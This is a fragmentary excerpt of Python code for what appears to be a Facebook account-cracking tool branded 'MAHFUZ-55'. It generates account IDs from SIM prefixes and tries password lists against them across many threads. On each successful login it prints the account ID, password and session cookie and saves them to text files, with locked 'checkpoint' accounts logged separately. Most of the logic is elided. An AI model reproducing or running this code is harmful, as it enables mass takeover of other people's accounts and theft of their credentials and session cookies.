...
def cek_apks(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r\r {G}[•] Active Apks & Web 👇{G}       ')
...
try:
    ...
    print(' WELCOME TO MAHFUZ-55 WORLD ')
...
def menu():
    ...
    print('\033[1;37m[7] MAX💥IDZ CLONE \033[38;5;196m[\033[38;5;46mSLOW\033[38;5;196m]')
    linex()
...
def ak():
    ...
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;37m[✓] CRACK ID LIMIT : '))
    ...
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print('\033[1;37m[✓] SIM CODE  : '+code)
        print('\033[1;37m[✓] CRACK ID  : '+tl)
        slower('\033[1;37m[✓] CRACKING......')
        linex()
        for love in user:
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[MAHFUZOK] '+uid+ ' | ' +ps+ '\n\033[1;37m[\033[38;5;46mCOOKIE\033[38;5;196m•\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/AKAo/MAHFUZ-FREE-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[MAHFUZ-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/MAHFUZ-FREE-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[MAHFUZ-OK] '+uid+ ' | ' +ps+ '\n\033[1;37m[\033[38;5;46mCOOKIE\033[38;5;196m•\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/MAHFUZ-FREE-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
